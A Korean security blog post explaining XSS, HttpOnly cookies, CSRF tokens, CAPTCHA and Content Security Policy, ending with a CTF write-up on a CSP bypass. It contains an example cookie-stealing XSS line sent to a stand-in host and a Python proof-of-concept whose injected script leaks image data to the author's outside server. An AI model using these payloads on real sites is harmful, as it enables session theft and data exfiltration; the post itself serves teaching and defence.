---
layout: post
title: "이해하기 쉬운 웹 보안 모델 이야기 2 (CSP)"
author: "zairo"
comments: true
tags: [web]
---

라온화이트햇 핵심연구팀 박의성

## 1. 개요

본 문서는 지난 시리즈인 SOP(Same-Origin Policy)와 CORS(Cross-Origin Resource Sharing)에 이어서 또 다른 웹 보안 모델인 CSP(Content Security Policy)에 대해 서술한 문서입니다. CSP 또한 많은 웹 개발자 분들과 보안 연구원 분들을 귀찮고 힘들게(?) 하는 정책이자, 웹 상에서 취약점으로 인해 정보가 탈취되거나 악의적인 행위가 수행되지 않도록 막아주는 중요한 정책 입니다. 이번 글은 지난 글에 이어진 이야기로 이해를 돕기 위해 "이해하기 쉬운 웹 보안 모델 이야기" 시리즈의 이전 글인 "이해하기 쉬운 웹 보안 모델 이야기 1 (SOP, CORS)"을 먼저 읽고 오시길 권장드립니다.

## 2. 웹 브라우저 보안의 천적, XSS 취약점

웹의 기본적인 보안 정책은 지난 글에서 설명 드렸던 Same-Origin Policy(이하 SOP)에 뿌리를 두고 있습니다. SOP의 웹 보안 모델의 본래의 설계 목적은 JavaScript와 같은 언어가 해당 사이트 개발자가 설계한대로만 실행된다는 것을 전제로 JavaScript 내에서 타 도메인에 접근하지 못하게 하여 웹과 웹 간의 분리가 되는 완벽한 샌드박스를 기대하며 설계하였습니다. 

하지만 기대와 현실은 달랐습니다. 웹과 웹 간의 분리가 되는 완벽한 샌드박스와는 달리 현실은 해커가 해당 브라우저 내의 쿠키를 포함한 정보들을 탈취 할 수 있었습니다. 바로 Cross-site scripting(이하 XSS) 취약점 때문 입니다. 

XSS 취약점은 웹사이트 관리자가 아닌 사람이 웹 페이지에 악성 스크립트를 삽입할 수 있는 취약점입니다. XSS 취약점은 웹 브라우저가 생겨난 1990년대부터 보고 되었고 2000년 1월에 XSS라는 명칭이 붙었다고 알려져 있습니다. 가장 일반적인 보안 취약점으로 알려져 있으며 현재까지도 가장 많이 발견되고 있는 취약점 중 하나 입니다. 

웹 개발자의 실수로 외부로부터 입력되는 파라미터에 대한 적절한 검증을 거치지 않고 페이지 내부에 포함하는 기능을 구현하였고, 해커는 이 기능을 악용하여 XSS 취약점으로 파라미터를 통해 정보를 탈취하는 악성 스크립트를 삽입하였습니다. 이렇게 삽입된 스크립트는 피해자의 브라우저에서 실행되어 사용자 브라우저의 정보를 탈취할 수 있었습니다. 

예를 들어, 공격자가 `location.href='http://example.com?'+document.cookie`와 같은 스크립트를 삽입하게 되면 삽입한 스크립트는 피해자의 브라우저에서 실행되고, 사용자의 세션 ID가 포함된 쿠키 값이 공격자가 설정한 도메인으로 전송 되어 공격자는 서버로 전송된 값을 탈취할 수 있게 됩니다. 이후 공격자는 탈취한 세션 ID를 통해 해당 페이지에 접속하여 사용자의 계정을 탈취할 수 있습니다. 만약, 사건의 발단인 웹 개발자의 실수가 없었다면 SOP 정책의 설계상 정보가 탈취되는 일은 발생하지 않았을 것 입니다.

## 3. Set-Cookie HttpOnly

이제부터는 XSS 취약점에 의해 사용자의 정보가 위험한 상태에서 이를 보완할 수 있는 보안 정책을 알아보겠습니다. 먼저 알아볼 Set-Cookie 응답 헤더는 서버에서 사용자 브라우저에 쿠키를 전송하기 위해 사용됩니다. 이 Set-Cookie 헤더에는 XSS 취약점을 이용한 공격을 방해하기 위한 HttpOnly 속성이 존재합니다. HttpOnly 속성은 JavaScript에서의 document.cookie에 대한 접근을 차단하는 정책으로 XSS 취약점을 완화하기 위한 목적으로 설계되었으며 2008년 Firefox 3.0에 최초로 적용되었습니다. 

일반적으로 공격자들이 XSS 취약점을 활용하여 많이 노리는 것은 세션 ID가 포함된 쿠키 값 입니다. 왜냐하면 공격자가 세션 ID가 포함된 쿠키 값만 획득하게 되면 해당 사용자 계정을 탈취할 수 있고 그 후 탈취한 계정을 가지고 악의적인 행위를 할 수 있기 때문입니다. HttpOnly 속성은 공격자들이 가장 많이 노리는 세션 ID가 포함된 쿠키 값에 대해 JavaScript에서 접근을 차단함으로써 근본적으로 XSS 취약점을 활용한 계정 탈취가 불가능하도록 하는 정책입니다.

```
Set-Cookie: <cookie-name>=<cookie-value>; HttpOnly
```

위와 같이 서버에서 전송되는 HTTP 응답 패킷의 Set-Cookie 헤더에 HttpOnly 속성을 적용할 수 있습니다.  XSS 취약점이 발생하더라도 공격자들이 최종 목표로 세션 ID를 타겟으로 노리는 것을 역으로 활용하여 HttpOnly 속성을 사용하여 쿠키 값에 대한 접근을 차단함으로써 공격자로부터 사용자를 안전하게 보호할 수 있습니다.

하지만, 단순하게 세션 ID가 포함된 쿠키 값에 대한 접근을 차단한다고 모든 문제가 해결되지는 않습니다. XSS 취약점은 상황에 따라 Cross-site request forgery(이하 CSRF) 취약점으로 발전할 수 있는 가능성이 열려 있기 때문입니다. CSRF 취약점이 발생하게 되면 사용자 자신의 의지와는 무관하게 공격자가 의도한 행위(수정, 삭제, 등록 등)를 수행하게 됩니다. 예를 들어 회원 정보 수정 요청을 강제로 전송하여 비밀번호를 공격자가 원하는 비밀번호로 변경하거나, 자신의 포인트를 공격자에게 선물하는 등의 본래 사이트에 존재하는 기능을 활용한 다양한 행위가 가능합니다.

## 4. CSRF Token & CAPTCHA

사용자가 회원 정보 수정 등 중요한 행위를 수행하는 페이지에서는 임의 랜덤 값인 CSRF token을 이용하여 CSRF 취약점에 대응할 수 있습니다. CSRF token을 활용하는 방법은 실제 사용자의 사용성에 영향을 주지 않는다는 장점을 가지고 있지만 다소 간단하게 우회될 수 있는 단점을 가지고 있습니다. CSRF token을 활용하는 방법은 회원 정보 수정 페이지 등에서 보이지 않는 input을 만들어 랜덤한 문자열을 CSRF token으로 출력합니다. 이후, 수정 기능을 처리하는 페이지에서 이전 페이지에 출력한 CSRF token과 전송된 CSRF token 값을 비교하여 해당 요청이 이전 페이지에서 전송되었는지 확인할 수 있습니다. 하지만 이 방법 또한 요청 전 페이지의 응답 값을 가져와서 CSRF token 추출 후 데이터 전송 시 CSRF token 값을 함께 전송하면 우회할 수 있으므로 CSRF 취약점에 대한 완전한 방어는 불가능 합니다. 

![/assets/2021-05-01/csp.png](/assets/2021-05-01/csp.png)

**[Google CAPTCHA 예제 이미지]**

이러한 문제를 해결하기 위해 실제 사람인지 컴퓨터 프로그램을 통해 전송되는 요청인지 확인하는 기술인 Completely Automated Public Turing test to tell Computers and Humans Apart(CAPTCHA)를 이용하여 대부분의 CSRF 취약점을 차단할 수 있습니다. CAPTCHA는 행위, 오디오, 이미지 등을 통해 기계와 사람을 구별할 수 있도록 하는 기술입니다. 회원 정보 수정 페이지에 CAPTCHA를 삽입하여 사람으로 판단될 경우에만 정상적으로 회원 정보 수정 기능을 수행하도록 하는 것입니다. 이 방법은 사람임을 증명하기 위해 드래그와 같은 특정 행위를 하거나, 이미지를 인식하여 클릭하는 등 다소 사용성에 불편을 줄 수 있는 방법이지만 프로그래밍을 통해 우회하기 매우 힘들기 때문에 보안성 측면은 상당 부분 향상 시킬 수 있는 방법입니다.

## 5. Content Security Policy(CSP)

지금까지 XSS 취약점으로부터 웹 브라우저를 안전하게 보호하기 위한 다양한 방어 방법들을 알아보았습니다. CAPTCHA를 이용하여 회원 정보 수정 등 중요한 페이지에서 CSRF 취약점을 활용하여 공격자가 의도한 행위를 수행하지 못하도록 방어 할 수 있습니다. 하지만 여전히 공격자가 XSS 취약점을 통해 사용자의 브라우저에서 JavaScript를 실행할 수 있다는 점은 변하지 않았습니다. 

XSS 취약점을 이용하여 JavaScript를 실행할 수 있으므로 취약점 발생시 구매 내역이라던가 회원 정보 수정 페이지 등 단순 정보 출력 페이지에 요청하여 개인정보를 탈취할 수 있는 가능성은 여전히 남아있습니다. XSS 취약점을 이용한 공격 가능성이 계속하여 잔존함에 따라 XSS 취약점을 이용한 공격이 다수 발생하게 되었고 2007년 일부 연구자들은 웹 사이트의 68%가 XSS 공격에 노출 될 가능성이 있다고 밝혔으며, XSS 취약점에 대한 방어법이 절실히 필요하게 되었습니다. 따라서 그에 대한 방어법 연구가 계속 진행되었으며 XSS 취약점의 대응방안인 Content Security Policy(이하 CSP)가 2011년 Firefox 4.0에 처음 등장하게 됩니다.

CSP는 XSS, 클릭재킹, 코드 인젝션 등의 공격을 예방하기 위해 도입된 정책으로써 브라우저에서 로드되는 모든 컨텐츠에 제약을 두어 통제하는 보안 정책입니다. 원래 이름은 Content Restrictions이었으며 2004년 Robert Hansen에 의해 처음 제안되었다고 알려져 있습니다. CSP는 공격자가 웹 내부에서 자바스크립트를 실행할 수 있더라도 특정 도메인의 리소스만 참조할 수 있게 하거나, 리소스를 아예 참조 못하게 하는 등의 리소스에 대한 보안 정책을 설정하여 허가되지 않은 스크립트 로드 자체를 방지하는 보안 정책 입니다.

```
Content-Security-Policy: default-src 'self'
```

CSP는 응답 헤더와 meta 태그를 통해 설정 가능하며, 위와 같이 설정할 경우 모든 컨텐츠에 대하여 현재 사이트의 도메인 범위 내에서만 로드가 가능합니다. 예를 들어 script 태그의 src 옵션을 사용할 경우 cdn 사이트 도메인을 사용하게 되면 CSP 정책에 의하여 차단됩니다. 

```
Content-Security-Policy: default-src 'self' trusted.com *.trusted.com
```

따라서 기본적으로 현재 사이트의 도메인 범위 내에서만 로드를 허용하고 cdn과 같이 도메인을 특정할 수 있는 경우엔 위와 같이 특정 도메인만 허용하도록 설정할 수 있습니다.

```
Content-Security-Policy: default-src 'self'; img-src *; media-src media1.com media2.com; script-src userscripts.example.com
```

그 외에도 img-src, media-src와 같이 여러 태그 종류별로 보안 설정을 다르게 하도록 설정할 수 있습니다. 위와 같이 설정하게 되면 특정하지 않은 태그의 src의 경우에는 현재 사이트의 도메인 범위 내만 허용하도록 하고 img는 모두 허용, media는 media1.com, media2.com에서만 허용, script는 [userscripts.example.com](http://userscripts.example.com) 도메인만 허용하도록 설정됩니다. 기타 항목에 따른 자세한 설정 방법은 [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)에서 확인할 수 있습니다.

## 6. CSP bypass

최근 CONFidence 2020 CTF Finals에서 Yet Another Yet Another Cat Challenge 문제명으로 CSP를 우회하는 문제가 출제된 적이 있습니다.

```
Content-Security-Policy: default-src 'none'; form-action 'self'; frame-ancestors 'none'; style-src https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css; img-src 'self'; script-src 'nonce-cyotMpPGPBs7xFYiedGn3Q' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/; frame-src https://www.google.com/recaptcha/
```

문제에서는 위와 같이 Content-Security-Policy에 대부분의 제약을 설정해두었고 허용된 설정이 많지 않았습니다. form-action, img-src만 self로 현재 사이트의 도메인 범위 내만 허용하도록 설정 되어 있습니다.

theme 파라미터를 통해 블랙, 화이트 테마를 바꿀 수 있도록 기능을 지원하였는데 이 부분에서 DOM XSS가 발생하였습니다. 또한 운영자 쿠키를 가지고 /flag?var=flag 경로에 접근할 경우 flag가 출력됩니다. /flag에서는 var 파라미터를 통해 응답 값의 prefix를 설정할 수 있었습니다. 결론적으로 XSS가 가능하고 img-src가 self인 점을 이용하여 /flag?var=에 prefix로 bmp header를 삽입하여 이미지로 둔갑(?)하여 로드한 다음, 해당 이미지를 canvas로 읽어서 데이터를 추출해내었습니다.

```python
import urllib.parse
import requests

data = open('1.bmp', 'rb').read()[:0x30]
print(urllib.parse.quote(data))

url = "http://yayacc.zajebistyc.tf/note"

data = {
    "cat_url": "/flag?var="+urllib.parse.quote(data),
    "content": "<marquee>Yee</marquee>",
}

res = requests.post(url, data=data, allow_redirects=False)

u = res.text[res.text.find("<a href")+9:res.text.find("\">/note/")]
uuid = u[u.rfind('/')+1:]

data = {
    "cat_url": '''/*</script>
    <META HTTP-EQUIV="refresh" CONTENT="0;url=//yayacc.zajebistyc.tf/note/'''+ uuid +'''?theme=1;img.onload = function(){var canvas=document.createElement(`canvas`);var ctx=canvas.getContext(`2d`);ctx.drawImage(img,0,0);location.href=`http://zairo.kr:1234/?`+escape(String.fromCharCode.apply(null, ctx.getImageData(0,0,img.width,img.height).data.slice(0,20)));}">
    //
    ''',
    "content": "<marquee>Yee</marquee>",
}

res = requests.post(url, data=data, allow_redirects=False)

u = res.text[res.text.find("<a href")+9:res.text.find("\">/note/")]
print("http://yayacc.zajebistyc.tf" + u)
```

[1.bmp](/assets/2021-05-01/1.bmp)

Content-Security-Policy 설정 시 직접적인 발단이 될 수 있는 script-src에만 nonce, URL을 통한 제약을 설정하고 img-src에 대한 설정은 'self' 또는 *로 설정하는 것이 일반적인데, 만약 XSS 취약점이 발생한다면 이미지를 통해서도 데이터를 유출할 수 있음을 알려주고자 하는 것이 출제자의 의도로 풀이 됩니다.

위는 제가 대회 당시 해당 문제를 풀었던 PoC(Proof of Concept) 코드 입니다. 현재는 해당 문제에 대한 문제 코드 및 정보가 남아 있지 않아 자세히 설명드리지 못하는 점 양해 부탁드립니다. 이 외에도 CSP 제약 안에서 다양한 기법(CSS injection, Cache poisoning, CDN callback, Side-channel attack등)을 이용한 CSP 우회 방법 등이 계속하여 등장하고 있으므로 우회가 가능한 케이스를 지속적으로 습득하여 우회가 가능한 환경을 만들지 않도록 하는 것이 중요할 것으로 사료됩니다.

## 7. 마치며

이번 시리즈에서는 XSS 취약점에서 부터 시작한 여러가지 보안 정책에 대해서 알아보았습니다. 다수의 정책이 서로 다른 커버리지를 보완하는 것을 보면서 공격자가 하나의 정책을 우회하더라도 다른 정책에서 차단될 수 있도록 전체적인 단계별로 Layered Security 개념을 적용하는 것이 중요하다는 것을 이번 사례를 통해 알아보았습니다. 많은 웹 개발자 분들과 보안 연구원 분들이 CSP에 대해 이해하고 보다 안전한 서비스를 만드는 것에 제 글이 조금이나마 도움이 되었으면 좋겠습니다. 긴 글 읽어주셔서 감사합니다. 

## 8. 참고자료

[https://developers.google.com/web/fundamentals/security/csp?hl=ko](https://developers.google.com/web/fundamentals/security/csp?hl=ko)

[https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Content-Security-Policy](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Content-Security-Policy)

[https://ko.wikipedia.org/wiki/콘텐츠_보안_정책](https://ko.wikipedia.org/wiki/%EC%BD%98%ED%85%90%EC%B8%A0_%EB%B3%B4%EC%95%88_%EC%A0%95%EC%B1%85)

[https://en.wikipedia.org/wiki/Content_Security_Policy](https://en.wikipedia.org/wiki/Content_Security_Policy)

[https://blog.mozilla.org/security/2013/06/11/content-security-policy-1-0-lands-in-firefox/](https://blog.mozilla.org/security/2013/06/11/content-security-policy-1-0-lands-in-firefox/)

[https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Set-Cookie](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Set-Cookie)

[https://ko.wikipedia.org/wiki/사이트_간_요청_위조](https://ko.wikipedia.org/wiki/%EC%82%AC%EC%9D%B4%ED%8A%B8_%EA%B0%84_%EC%9A%94%EC%B2%AD_%EC%9C%84%EC%A1%B0)

[https://ko.wikipedia.org/wiki/CAPTCHA](https://ko.wikipedia.org/wiki/CAPTCHA#reCAPTCHA)

[https://ko.wikipedia.org/wiki/사이트_간_스크립팅](https://ko.wikipedia.org/wiki/%EC%82%AC%EC%9D%B4%ED%8A%B8_%EA%B0%84_%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%8C%85)

[https://en.wikipedia.org/wiki/Cross-site_scripting](https://en.wikipedia.org/wiki/Cross-site_scripting)

[https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)